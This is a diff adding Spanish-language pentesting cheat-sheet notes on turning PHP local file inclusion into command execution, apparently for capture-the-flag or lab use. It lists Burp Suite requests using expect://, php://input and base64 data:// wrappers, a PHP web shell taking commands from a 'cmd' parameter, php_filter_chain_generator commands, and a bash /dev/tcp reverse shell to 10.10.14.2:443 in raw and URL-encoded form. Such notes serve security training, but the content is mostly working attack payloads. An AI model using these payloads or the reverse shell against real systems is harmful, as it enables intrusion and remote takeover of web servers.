@@ -149,4 +149,59 @@ Otro **Groupers** que podemos usar en la web es el siguiente:
 Este nos ayudara a ejecutar comandos
 * index.php?page=**php://filter/convert.iconv.utf-8.utf-16/resource=secret.php** y obtendriamos como resultado
 
+### En BurpSuite
+Este **Groupers** lo podemos usar en BurpSuite:
+Nos ayudara a ejecutar comandos
+* POST /?filename=**expect://whoami** HTTP/1.1  
+Obtendriamos el whoami de la maquina (Si es que esta habilitado)
 
+
+Este **Groupers** lo podemos usar en BurpSuite:
+Nos ayudara a ejecutar comandos
+* POST /?filename=**php://input** HTTP/1.1 
+Obtendriamos el comando que nosotros le pasemos (whoami, id, etc...)
+```php
+<?php system("whoami"); ?>              # Esta parte se pone al final de la peticion en BurpSuite
+```
+
+
+Este **Groupers** lo podemos usar en BurpSuite:
+Nos ayudara a ejecutar comandos, pasandole un comando que este encodeado en base64
+```php
+<?php system("whoami"); ?>        # Lo codificamos en base64 = PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4=
+```
+* GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4= HTTP/1.1 
+Obtendriamos el comando que nosotros le pasemos (whoami, id, etc...)
+
+
+Este **Groupers** lo podemos usar en BurpSuite:
+Para controlar el comando que querramos injectar.
+```php
+<?php system($_GET["cmd"]); ?>         # Lo codificamos en base64 = PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+, debemos de url-encodear el + = %2b
+```
+* GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=whoami HTTP/1.1 
+* GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2b&cmd=whoami HTTP/1.1  -> La manera correcta 
+Debemos de colocar al final **&cmd=comando** y es ahi donde podriamos colocar cualquier comando 
+
+
+### PHP Filter Chain Generator
+
+Podemos usar el siguiente comando y nos lo hara automaticamente con la tool.
+
+```bash
+❯ python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'     # Nos crea la expresion 
+```
+Esto es en la url de la web.
+* localhost?filename='Aqui colocamos el resultado del comando anterior'   
+Podemos ejecutar comandos. Es una forma mas avanzada de hacerlo.
+
+
+Para controlar el comando a ejecutar.
+```bash
+❯ python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'     # Nos crea la expresion, & lo debemos de url-encodear = %26
+```
+Esto es en la url de la web.
+* localhost?filename='Aqui colocamos el resultado del comando anterior'&cmd=bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"
+* localhost?filename='Aqui colocamos el resultado del comando anterior'&cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.2/443 0>%261"     -> La manera correcta
+Podemos ejecutar comandos. Es una forma mas avanzada de hacerlo.
+Debemos de colocar al final **&cmd=bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"** y es ahi donde podriamos colocar cualquier comando
